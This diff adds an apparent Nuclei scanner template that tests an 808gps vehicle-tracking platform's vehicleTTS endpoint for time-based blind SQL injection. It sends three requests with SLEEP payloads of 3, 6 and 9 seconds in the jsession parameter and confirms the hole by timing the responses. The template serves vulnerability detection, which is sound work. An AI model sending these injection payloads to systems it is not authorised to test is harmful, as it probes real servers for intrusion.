@@ -1,0 +1,37 @@
+id: 808gps-vehicletts-sqli
+
+info:
+  name: 808gps-vehicletts-sqli
+  author: 808gps-vehicletts-sqli
+
+
+requests:
+  - raw:
+      - |     
+        GET /StandardApiAction_vehicleTTS.action?DevIDNO=1&Text=x&jsession=2C0EB587191F68C441F128919862AC11%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(3)))DpjE)--%20gtMe HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+      - |
+        GET /StandardApiAction_vehicleTTS.action?DevIDNO=1&Text=x&jsession=2C0EB587191F68C441F128919862AC11%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(6)))DpjE)--%20gtMe HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+      - |
+        GET /StandardApiAction_vehicleTTS.action?DevIDNO=1&Text=x&jsession=2C0EB587191F68C441F128919862AC11%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(9)))DpjE)--%20gtMe HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
